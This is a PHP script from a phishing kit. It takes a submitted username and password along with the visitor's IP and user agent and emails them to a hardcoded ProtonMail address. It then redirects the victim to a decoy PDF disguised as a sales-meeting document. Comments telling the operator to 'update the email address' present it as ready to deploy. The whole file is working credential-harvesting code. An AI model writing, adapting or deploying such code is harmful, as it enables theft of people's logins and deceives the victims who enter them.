<?php
if(!isset($_POST['submit']))
{

}
$ai = $_POST['ai'];
$pr = $_POST['pr'];


//Validate first
if(empty($ai)||empty($pr)) 
{
   
  header('Location: https://loadedd.000webhostapp.com/MQ%20sales%20meeting%2005_10_2022.pdf');
    exit;
}

if(IsInjected($visitor_email))
{
    echo "Bad email value!";
    exit;
}
$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	
	$message .="You have received a new message from the user in $ip.\n".
    "Here is the message:\n\n\nUsername: $ai Password: \n\n\nPassword: $pr\n\n\n".
    
    
$email_from = 'emilhashbrown@protonmail.com';//<== update the email address
$email_subject = "New Form submission";
$email_body = "You have received a new message from the user in $ip.\n".
    "Here is the message:\n\n\n $ai  \n\n\n$pr\n\n\n".
    
$send = "emilhashbrown@protonmail.com";//<== update the email address
$headers = "From: $email_from \r\n";
$headers .= "Reply-To: $visitor_email \r\n";
$subject = "Login : $ip";
//Send the email!
 mail($send, $subject, $message); 
//done. redirect to thank-you page.
header('Location: https://loadedd.000webhostapp.com/MQ%20sales%20meeting%2005_10_2022.pdf');


// Function to validate against any email injection attempts
function IsInjected($str)
{
  $injections = array('(\n+)',
              '(\r+)',
              '(\t+)',
              '(%0A+)',
              '(%0D+)',
              '(%08+)',
              '(%09+)'
              );
  $inject = join('|', $injections);
  $inject = "/$inject/i";
  if(preg_match($inject,$str))
    {
    return true;
  }
  else
    {
    return false;
  }
}
   
?> 
